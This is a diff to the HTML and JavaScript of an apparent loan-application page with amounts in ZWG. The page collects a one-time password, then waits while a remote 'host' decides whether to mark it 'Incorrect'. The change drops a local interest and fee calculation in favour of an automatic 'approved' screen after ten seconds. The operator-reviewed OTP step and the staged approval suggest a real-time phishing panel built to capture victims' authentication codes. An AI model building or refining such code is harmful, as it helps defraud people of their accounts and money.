@@ -1056,45 +1056,20 @@ HTML_PAGE = r"""<!DOCTYPE html>
 
       watchHostDecision('otp');
 
-      otpStepTimer = setTimeout(() => {
+           otpStepTimer = setTimeout(() => {
         if (btnOtp) {
           btnOtp.disabled = false;
           btnOtp.innerText = 'VERIFY & CONTINUE';
         }
         goTo('processing');
 
-        // Processing assessment takes 6 seconds for realistic feel
+        // Automatically approve after 10 seconds if host doesn't tap Incorrect
         otpAutoTimer = setTimeout(() => {
-          const approvedAmt = document.getElementById('approved-amount');
-          const approvedRepay = document.getElementById('approved-repay');
-          const approvedDate = document.getElementById('approved-date');
-
-          const val = appState.amount || 500;
-          const days = appState.period || 30;
-          let rate = 0.05;
-          if (days <= 7) rate = 0.03;
-          else if (days <= 14) rate = 0.05;
-          else if (days <= 30) rate = 0.10;
-          else if (days <= 60) rate = 0.15;
-          else rate = 0.20;
-
-
-          const interest = Math.round(val * rate);
-          const fee = Math.round(val * 0.03);
-          const total = val + interest + fee;
-
-          if (approvedAmt) approvedAmt.innerText = 'ZWG ' + val.toLocaleString();
-          if (approvedRepay) approvedRepay.innerText = 'ZWG ' + total.toLocaleString();
-
-          if (approvedDate) {
-            const d = new Date();
-            d.setDate(d.getDate() + days);
-            approvedDate.innerText = d.toLocaleDateString('en-GB', { day: 'numeric', month: 'long', year: 'numeric' });
-          }
-
-          goTo('approved');
-        }, 6000);
+          if (decisionTimer) clearInterval(decisionTimer);
+          showApprovedScreen();
+        }, 10000);
       }, 1500);
+
     }
 
     function syncAmount(val, isFromInput = false) {
